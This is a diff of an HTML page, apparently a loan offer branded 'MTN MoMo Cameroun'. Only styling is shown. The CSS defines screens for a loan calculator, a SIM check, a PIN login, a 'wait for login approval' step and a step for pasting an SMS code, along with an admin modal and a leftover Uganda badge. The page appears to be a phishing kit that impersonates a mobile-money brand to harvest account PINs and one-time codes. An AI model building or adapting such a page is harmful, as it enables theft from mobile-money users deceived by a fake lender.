@@ -2,667 +2,3048 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it Cameroon - Fast & Secure Loans</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <meta charset="UTF-8" />
+    <!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e9788f60-af43-4c03-9c43-ac933dee9d3b
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MTN MoMo Cameroun – Prêts faciles</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <style>
          :root {
-            --orange: #FF7900;
-            --orange-hover: #e66a00;
-            --dark: #1a1a1a;
-            --text-gray: #4a5568;
-            --glass-bg: rgba(255, 255, 255, 0.45);
-            --glass-border: rgba(255, 255, 255, 0.6);
-            --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
+            --mtn-dark: #003366;
+            --mtn-gold: #FFD700;
+            --mtn-light: #004080;
+            --grad: linear-gradient(to right, #003366, #004080);
+            --page-bg: #F5F5F5;
+            --white: #FFFFFF;
+            --text-dark: #1C2340;
+            --text-mid: #444;
+            --text-light: #888;
+            --border: #ddd;
+            --radius: 12px;
+            --radius-sm: 8px;
         }
         
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
         }
         
         body {
-            background-color: #f0f4f8;
-            color: var(--dark);
-            overflow-x: hidden;
+            font-family: 'Inter', sans-serif;
+            background: var(--page-bg);
+            color: var(--text-dark);
+            min-height: 100vh;
+        }
+        /* ─── MTN MOMO LOGO ─── */
+        
+        .mtn-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+        }
+        
+        .mtn-logo .logo-img {
+            height: 44px;
+            object-fit: contain;
+            display: block;
+        }
+        
+        .mtn-logo .logo-img.small {
+            height: 30px;
+        }
+        
+        .mtn-logo .logo-img.tiny {
+            height: 24px;
+        }
+        
+        .mtn-logo-text {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            line-height: 1.1;
+        }
+        
+        .mtn-logo-sub {
+            font-size: 0.65rem;
+            color: #888;
+            font-weight: 500;
+            line-height: 1;
+        }
+        
+        .mtn-logo .logo-text-white {
+            color: #fff;
+        }
+        
+        .mtn-logo .logo-sub-white {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .mtn-logo .logo-gold {
+            color: var(--mtn-gold);
+        }
+        /* ─── UGANDA FLAG BADGE ─── */
+        
+        .flag-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--mtn-gold);
+            background: rgba(255, 215, 0, 0.15);
+            padding: 2px 12px 2px 8px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            margin-top: 1px;
+        }
+        
+        .flag-badge .flag-emoji {
+            font-size: 1.1rem;
+            line-height: 1;
+        }
+        /* ─── ADMIN MODAL (IMPORTANT NOTE) ─── */
+        
+        #adminModalOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(4px);
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        #adminModalOverlay.show {
+            display: flex;
+        }
+        
+        .admin-modal {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 36px 32px 28px;
+            max-width: 460px;
+            width: 100%;
+            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.3);
+            animation: modalPop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
+            border-top: 6px solid var(--mtn-gold);
         }
         
-        .orb {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            z-index: -1;
-            animation: float 15s infinite alternate ease-in-out;
-        }
-        
-        .orb-1 {
-            width: 400px;
-            height: 400px;
-            background: rgba(255, 121, 0, 0.4);
-            top: -100px;
-            left: -100px;
-        }
-        
-        .orb-2 {
-            width: 300px;
-            height: 300px;
-            background: rgba(0, 150, 255, 0.3);
-            bottom: 10%;
-            right: 5%;
-            animation-delay: -5s;
-        }
-        
-        .orb-3 {
-            width: 350px;
-            height: 350px;
-            background: rgba(255, 200, 0, 0.3);
-            top: 40%;
-            left: 30%;
-            animation-duration: 20s;
-        }
-        
-        @keyframes float {
-            0% {
-                transform: translate(0, 0) scale(1);
+        @keyframes modalPop {
+            from {
+                opacity: 0;
+                transform: scale(0.85) translateY(20px);
             }
-            50% {
-                transform: translate(50px, 50px) scale(1.1);
-            }
-            100% {
-                transform: translate(-30px, 80px) scale(0.9);
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
             }
         }
         
-        nav {
+        .admin-modal .modal-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            margin-bottom: 12px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 20px 5%;
-            background: var(--glass-bg);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border-bottom: 1px solid var(--glass-border);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            gap: 10px;
         }
         
-        .logo {
-            background-color: var(--orange);
-            padding: 5px 15px;
-            border-radius: 8px;
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: -1px;
-            display: inline-block;
+        .admin-modal .modal-title span {
+            font-size: 1.4rem;
         }
         
-        .logo .max {
-            color: white;
+        .admin-modal .modal-body {
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: var(--text-mid);
+            margin-bottom: 22px;
+            white-space: pre-wrap;
+            word-break: break-word;
         }
         
-        .logo .it {
-            color: black;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 30px;
-        }
-        
-        .nav-links a {
-            text-decoration: none;
-            color: var(--dark);
+        .admin-modal .modal-close-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 0.9rem;
             font-weight: 600;
-            transition: color 0.3s;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
         }
         
-        .nav-links a:hover {
-            color: var(--orange);
+        .admin-modal .modal-close-btn:hover {
+            opacity: 0.88;
+        }
+        /* ─── PAGE SYSTEM ─── */
+        
+        .page {
+            display: none;
+            min-height: 100vh;
+            animation: fadeIn 0.3s ease;
         }
         
-        .hero {
+        .page.active {
             display: flex;
+            flex-direction: column;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* ─── OVERLAY / MODAL (generic) ─── */
+        
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(3px);
+            z-index: 999;
             align-items: center;
-            justify-content: space-between;
-            padding: 80px 5%;
-            min-height: 80vh;
-            gap: 50px;
-            flex-wrap: wrap;
-        }
-        
-        .hero-content {
-            flex: 1;
-            min-width: 300px;
-        }
-        
-        .hero-content h1 {
-            font-size: 3.5rem;
-            line-height: 1.2;
-            margin-bottom: 20px;
-        }
-        
-        .hero-content h1 span {
-            color: var(--orange);
-        }
-        
-        .hero-content p {
-            font-size: 1.2rem;
-            color: var(--text-gray);
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        
-        .badges {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 40px;
-            flex-wrap: wrap;
-        }
-        
-        .badge {
-            background: var(--glass-bg);
-            backdrop-filter: blur(10px);
-            padding: 10px 20px;
-            border-radius: 50px;
-            border: 1px solid var(--glass-border);
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .badge i {
-            color: var(--orange);
-        }
-        
-        .calculator-wrapper {
-            flex: 1;
-            min-width: 350px;
-            display: flex;
             justify-content: center;
         }
         
-        .glass-card {
-            background: var(--glass-bg);
-            border-radius: 24px;
-            box-shadow: var(--glass-shadow);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid var(--glass-border);
-            width: 100%;
-            max-width: 450px;
-            padding: 40px 30px;
-            transition: transform 0.3s ease;
+        .overlay.show {
+            display: flex;
         }
         
-        .glass-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .calc-header {
+        .modal {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 40px 36px;
             text-align: center;
-            margin-bottom: 30px;
+            max-width: 320px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            animation: popIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
         
-        .calc-header h2 {
-            font-size: 24px;
-            margin-bottom: 8px;
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: scale(0.85);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
         
-        .calc-header p {
-            color: var(--text-gray);
-            font-size: 14px;
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #eee;
+            border-top-color: var(--mtn-gold);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 18px;
         }
         
-        .input-group {
-            margin-bottom: 30px;
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
         
-        .label-row {
+        .modal h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+        }
+        
+        .modal p {
+            font-size: 0.88rem;
+            color: var(--text-light);
+        }
+        /* ─── NAV ─── */
+        
+        .navbar {
+            background: var(--mtn-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+            height: 54px;
+            position: relative;
+            flex-shrink: 0;
+        }
+        
+        .nav-left {
+            position: absolute;
+            left: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.84rem;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        
+        .nav-left:hover {
+            color: #fff;
+        }
+        
+        .nav-right {
+            position: absolute;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            padding: 4px;
+        }
+        
+        .hline {
+            width: 20px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 1px;
+        }
+        /* ─── BUTTONS ─── */
+        
+        .btn-grad {
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+        }
+        
+        .btn-grad:hover {
+            opacity: 0.9;
+        }
+        
+        .btn-grad:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-gray {
+            background: #e0e0e0;
+            color: #666;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            flex: 1;
+            font-family: 'Inter', sans-serif;
+            transition: background 0.2s;
+        }
+        
+        .btn-gray:hover {
+            background: #d0d0d0;
+        }
+        /* ─── FORM ─── */
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        .field label {
+            display: block;
+            font-size: 0.82rem;
+            font-weight: 500;
+            color: var(--text-mid);
+            margin-bottom: 6px;
+        }
+        
+        .field input,
+        .field select,
+        .field textarea {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+        
+        .field input:focus,
+        .field select:focus,
+        .field textarea:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .field textarea {
+            resize: vertical;
+            min-height: 90px;
+        }
+        
+        .sel-wrap {
+            position: relative;
+        }
+        
+        .sel-wrap::after {
+            content: '▾';
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+            pointer-events: none;
+            font-size: 0.9rem;
+        }
+        
+        .field-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+        
+        .phone-row {
+            display: flex;
+        }
+        
+        .ph-pre {
+            padding: 11px 12px;
+            background: #f5f5f5;
+            border: 1.5px solid var(--border);
+            border-right: none;
+            border-radius: var(--radius-sm) 0 0 var(--radius-sm);
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #555;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+        }
+        
+        .phone-row input {
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important;
+            flex: 1;
+        }
+        
+        .field-hint {
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 5px;
+        }
+        /* ─── STEP PROGRESS ─── */
+        
+        .prog-row {
+            display: flex;
+            gap: 8px;
+            margin: 10px 0 24px;
+        }
+        
+        .prog-seg {
+            flex: 1;
+            height: 4px;
+            border-radius: 2px;
+            background: #e0e0e0;
+            transition: background 0.3s;
+        }
+        
+        .prog-seg.done {
+            background: var(--mtn-gold);
+        }
+        
+        .prog-seg.now {
+            background: var(--mtn-gold);
+        }
+        /* ─── STEP BUTTONS ─── */
+        
+        .step-btns {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        
+        .step-btns .btn-grad {
+            flex: 1;
+        }
+        /* ─── FOOTER ─── */
+        
+        .pg-footer {
+            margin-top: auto;
+            padding: 14px;
+            text-align: center;
+            font-size: 0.78rem;
+            color: var(--text-light);
+            background: #fff;
+            border-top: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        /* ───── PAGE 1: LANDING ───── */
+        
+        #page-landing {
+            background: var(--page-bg);
+        }
+        
+        .land-nav {
+            background: var(--mtn-dark);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            height: 52px;
+            flex-shrink: 0;
+        }
+        
+        .land-nav .hbg {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+        
+        .land-nav .hbg span {
+            width: 20px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 1px;
+            display: block;
+        }
+        
+        .land-center {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+        
+        .land-card {
+            width: 100%;
+            max-width: 520px;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            padding: 36px 32px;
+        }
+        
+        .land-card h1 {
+            font-size: 1.45rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        
+        .land-tagline {
+            text-align: center;
+            font-size: 0.84rem;
+            color: var(--text-light);
+            margin-bottom: 28px;
+        }
+        
+        .calc-box {
+            background: #fafafa;
+            border: 1px solid #eee;
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            margin-bottom: 22px;
+        }
+        
+        .calc-box h2 {
+            font-size: 0.92rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        
+        .calc-row2 {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
+            font-size: 0.81rem;
+            color: var(--text-mid);
+            margin-bottom: 6px;
         }
         
-        .label-row label {
-            font-size: 14px;
+        .calc-row2 .cv {
+            color: var(--mtn-gold);
             font-weight: 600;
-            color: var(--text-gray);
-        }
-        
-        .label-row span {
-            font-size: 18px;
-            color: var(--orange);
-            font-weight: 800;
         }
         
         input[type=range] {
-            -webkit-appearance: none;
             width: 100%;
-            background: transparent;
+            -webkit-appearance: none;
+            height: 6px;
+            border-radius: 4px;
+            outline: none;
+            cursor: pointer;
+            margin-bottom: 4px;
+            background: linear-gradient(to right, #4CAF50 0%, #4CAF50 10%, #8BC34A 20%, #CDDC39 30%, #FFEB3B 40%, #FFC107 50%, #FF9800 60%, #FF5722 70%, #E91E63 85%, #D32F2F 100%);
+            background-size: 100% 100%;
+            transition: filter 0.2s;
         }
         
         input[type=range]::-webkit-slider-thumb {
             -webkit-appearance: none;
-            height: 22px;
             width: 22px;
+            height: 22px;
             border-radius: 50%;
-            background: var(--orange);
+            background: radial-gradient(circle at 35% 35%, #FFD700, #E6A800);
+            border: 3px solid #fff;
+            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.7), 0 0 20px rgba(255, 215, 0, 0.3);
             cursor: pointer;
-            margin-top: -8px;
-            box-shadow: 0 2px 8px rgba(255, 121, 0, 0.5);
-            border: 2px solid white;
+            transition: transform 0.15s, box-shadow 0.15s;
         }
         
-        input[type=range]::-webkit-slider-runnable-track {
-            width: 100%;
-            height: 6px;
-            cursor: pointer;
-            background: rgba(0, 0, 0, 0.1);
-            border-radius: 4px;
+        input[type=range]::-webkit-slider-thumb:hover {
+            transform: scale(1.12);
+            box-shadow: 0 2px 20px rgba(255, 215, 0, 0.9), 0 0 30px rgba(255, 215, 0, 0.4);
         }
         
-        .slider-limits {
+        input[type=range]::-moz-range-thumb {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #FFD700, #E6A800);
+            border: 3px solid #fff;
+            cursor: pointer;
+            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.7);
+        }
+        
+        .range-ends {
             display: flex;
             justify-content: space-between;
-            font-size: 12px;
-            color: #888;
-            margin-top: 8px;
+            font-size: 0.72rem;
+            color: var(--text-light);
+            margin-bottom: 14px;
         }
         
-        .result-box {
-            background: rgba(255, 255, 255, 0.7);
-            border-radius: 16px;
-            padding: 20px;
+        .slider-hint-wrap {
+            text-align: center;
+            margin-bottom: 10px;
+            animation: hintPulse 1.8s ease-in-out infinite;
+        }
+        
+        .slider-hint-wrap .hint-arrow {
+            display: inline-block;
+            font-size: 1.3rem;
+            margin-right: 6px;
+            animation: arrowSlide 1.8s ease-in-out infinite;
+        }
+        
+        .slider-hint-wrap .hint-text {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--mtn-light);
+            background: rgba(255, 215, 0, 0.15);
+            padding: 4px 16px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+        }
+        
+        @keyframes hintPulse {
+            0%,
+            100% {
+                opacity: 0.7;
+                transform: translateY(0);
+            }
+            50% {
+                opacity: 1;
+                transform: translateY(-3px);
+            }
+        }
+        
+        @keyframes arrowSlide {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(6px);
+            }
+        }
+        
+        .monthly-box {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            border: 1px solid white;
         }
         
-        .result-box label {
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-gray);
+        .monthly-box .ml {
+            font-size: 0.82rem;
+            color: var(--text-light);
         }
         
-        .result-box .monthly-payment {
-            font-size: 22px;
-            color: var(--orange);
-            font-weight: 800;
-        }
-        
-        .btn-apply {
-            width: 100%;
-            background-color: var(--orange);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 121, 0, 0.3);
-        }
-        
-        .btn-apply:hover {
-            background-color: var(--orange-hover);
-            box-shadow: 0 6px 20px rgba(255, 121, 0, 0.4);
-            transform: translateY(-2px);
-        }
-        
-        .about {
-            padding: 80px 5%;
-            text-align: center;
-        }
-        
-        .about h2 {
-            font-size: 2.5rem;
-            margin-bottom: 50px;
-        }
-        
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 30px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .feature-card {
-            background: var(--glass-bg);
-            border-radius: 20px;
-            padding: 40px 20px;
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--glass-border);
-            box-shadow: var(--glass-shadow);
-            transition: transform 0.3s ease;
-        }
-        
-        .feature-card:hover {
-            transform: translateY(-10px);
-        }
-        
-        .feature-card i {
-            font-size: 3rem;
-            color: var(--orange);
-            margin-bottom: 20px;
-        }
-        
-        .feature-card h3 {
+        .monthly-box .ma {
             font-size: 1.5rem;
-            margin-bottom: 15px;
+            font-weight: 700;
+            color: var(--mtn-gold);
         }
         
-        .feature-card p {
-            color: var(--text-gray);
-            line-height: 1.6;
+        .feats-row {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px 0 0;
+            border-top: 1px solid #f0f0f0;
+            margin-top: 4px;
         }
         
-        .contact-section {
-            padding: 80px 5%;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .contact-section h2 {
+        .feat {
             text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 40px;
         }
         
-        .contact-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
+        .feat .fi {
+            font-size: 1.6rem;
+            margin-bottom: 5px;
         }
         
-        .contact-info-card {
-            background: var(--glass-bg);
-            border-radius: 20px;
-            padding: 30px;
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--glass-border);
-            box-shadow: var(--glass-shadow);
+        .feat .ft {
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        
+        .feat .fs {
+            font-size: 0.73rem;
+            color: var(--text-light);
+        }
+        
+        .land-footer {
+            background: var(--mtn-dark);
+            padding: 14px;
+            text-align: center;
+            font-size: 0.77rem;
+            color: rgba(255, 255, 255, 0.45);
+            flex-shrink: 0;
+        }
+        /* ───── STEP PAGES ───── */
+        
+        .step-center {
+            flex: 1;
             display: flex;
             align-items: flex-start;
-            gap: 20px;
+            justify-content: center;
+            padding: 28px 16px;
         }
         
-        .contact-info-card i {
+        .step-card {
+            width: 100%;
+            max-width: 480px;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            padding: 32px 28px;
+        }
+        
+        .step-card h2 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+        
+        .step-sub {
+            text-align: center;
+            font-size: 0.82rem;
+            color: var(--text-light);
+            margin-bottom: 4px;
+        }
+        /* ─── SUMMARY ─── */
+        
+        .sum-box {
+            border: 1px solid #e0e0e0;
+            border-left: 4px solid var(--mtn-gold);
+            border-radius: var(--radius-sm);
+            padding: 16px 14px;
+            margin: 16px 0;
+            background: #fafffe;
+        }
+        
+        .sum-box h3 {
+            font-size: 0.88rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .sum-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.82rem;
+            padding: 7px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .sum-row:last-child {
+            border-bottom: none;
+        }
+        
+        .sum-row .sk {
+            color: var(--text-light);
+        }
+        
+        .sum-row .sv {
+            font-weight: 500;
+        }
+        /* ───── PAGE: PROCESSING ───── */
+        
+        #page-processing {
+            background: linear-gradient(160deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .proc-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .proc-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 2rem;
-            color: var(--orange);
-            background: rgba(255, 121, 0, 0.1);
-            padding: 15px;
-            border-radius: 12px;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
         }
         
-        .contact-info-card h4 {
+        @keyframes pulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 0 16px rgba(255, 215, 0, 0);
+            }
+        }
+        
+        .proc-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .proc-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: SIM CARD CHECK ───── */
+        
+        #page-sim-check {
+            background: #fff;
+        }
+        /* ───── PAGE: LOGIN ───── */
+        
+        #page-login {
+            background: #fff;
+        }
+        
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        
+        .pin-box:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .pin-eye {
+            cursor: pointer;
+            color: var(--text-light);
             font-size: 1.2rem;
-            margin-bottom: 8px;
+            background: none;
+            border: none;
+            margin-left: 4px;
+            padding: 4px;
         }
         
-        .contact-info-card p,
-        .contact-info-card a {
-            color: var(--text-gray);
-            text-decoration: none;
+        .pin-delete {
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 1.1rem;
+            background: none;
+            border: none;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+        
+        .pin-delete:hover {
+            color: var(--mtn-gold);
+        }
+        /* ───── PAGE: WAIT FOR LOGIN APPROVAL ───── */
+        
+        #page-wait-login-approval {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wait-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
+        }
+        
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: SMS MESSAGE PASTE ───── */
+        
+        #page-sms-paste {
+            background: #fff;
+        }
+        
+        .sms-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            height: 52px;
+            border-bottom: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        
+        .sms-topbar .bk {
+            font-size: 1.1rem;
+            color: #333;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        .sms-body-wrap {
+            flex: 1;
+            padding: 32px 16px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+        }
+        
+        .sms-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+        }
+        
+        .sms-card h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--mtn-dark);
+        }
+        
+        .sms-hint {
+            font-size: 0.83rem;
+            color: var(--text-light);
+            margin-bottom: 22px;
+        }
+        
+        .sms-textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s;
+            min-height: 120px;
+            resize: vertical;
+        }
+        
+        .sms-textarea:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .sms-code-hint {
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        .btn-sms {
+            width: 100%;
+            padding: 13px;
+            background: #e8e8e8;
+            color: #aaa;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            margin-top: 16px;
+        }
+        
+        .btn-sms.rdy {
+            background: var(--grad);
